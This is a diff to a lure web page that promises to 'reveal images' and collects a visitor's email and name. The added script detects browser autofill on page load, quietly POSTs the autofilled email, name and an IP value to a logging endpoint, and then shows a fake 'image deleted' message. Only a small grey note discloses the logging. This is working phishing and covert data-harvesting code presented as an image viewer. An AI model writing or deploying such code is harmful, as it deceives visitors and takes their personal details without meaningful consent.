@@ -90,6 +90,14 @@
             color: #ef5350;
             font-size: 1.2em;
         }
+        .deleted-message p {
+            margin: 0;
+        }
+        .autofill-note {
+            font-size: 0.9em;
+            color: #7f8c8d;
+            margin-top: 10px;
+        }
         .footer {
             text-align: center;
             padding: 20px;
@@ -108,16 +116,18 @@
             <p style="margin-bottom: 20px; color: #7f8c8d;">No sign-up required – access your content instantly!</p>
             <div class="form-group">
                 <label for="email">Email Address</label>
-                <input type="email" id="email" name="email" required>
+                <input type="email" id="email" name="email" required autocomplete="email">
             </div>
             <div class="form-group">
                 <label for="name">Full Name</label>
-                <input type="text" id="name" name="name" required>
+                <input type="text" id="name" name="name" required autocomplete="name">
             </div>
             <button class="reveal-button" onclick="revealImages()">Reveal Images</button>
+            <div class="autofill-note">Note: Autofilled data will be logged and processed if detected.</div>
         </div>
         <div id="deleted-section" class="deleted-message">
             <p>This image has been deleted or is no longer available.</p>
+            <p id="logged-data" style="margin-top: 10px;"></p>
         </div>
     </div>
     <div class="footer">
@@ -125,18 +135,48 @@
     </div>
 
     <script>
+        // Detect autofill on page load or input change
+        function checkAutofill() {
+            const email = document.getElementById('email').value;
+            const name = document.getElementById('name').value;
+            if (email && name) {
+                logAutofillData(email, name);
+            }
+        }
+
+        // Check autofill on load and after a short delay for browser autofill
+        window.addEventListener('load', () => {
+            setTimeout(checkAutofill, 500); // Delay to allow browser autofill
+            document.getElementById('email').addEventListener('change', checkAutofill);
+            document.getElementById('name').addEventListener('change', checkAutofill);
+        });
+
         function revealImages() {
             const email = document.getElementById('email').value;
             const name = document.getElementById('name').value;
+            logAutofillData(email, name); // Log on manual reveal too
+        }
+
+        function logAutofillData(email, name) {
+            const ip = window.location.hostname === 'localhost' 
+                ? '127.0.0.1' 
+                : (document.head.querySelector('[name~=x-forwarded-for][content]')?.content || 'Unknown');
 
             // Log data to server
             fetch('/log-data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, name })
+                body: JSON.stringify({ email, name, ip })
+            }).then(response => {
+                if (response.ok) {
+                    displayDeletedMessage(email, name, ip);
+                }
             }).catch(error => console.error('Error logging data:', error));
+        }
 
-            // Hide form, show deleted message
+        function displayDeletedMessage(email, name, ip) {
+            const loggedData = document.getElementById('logged-data');
+            loggedData.textContent = `Logged: ${email}, ${name}, IP: ${ip}`;
             document.getElementById('form-section').style.display = 'none';
             document.getElementById('deleted-section').style.display = 'block';
         }
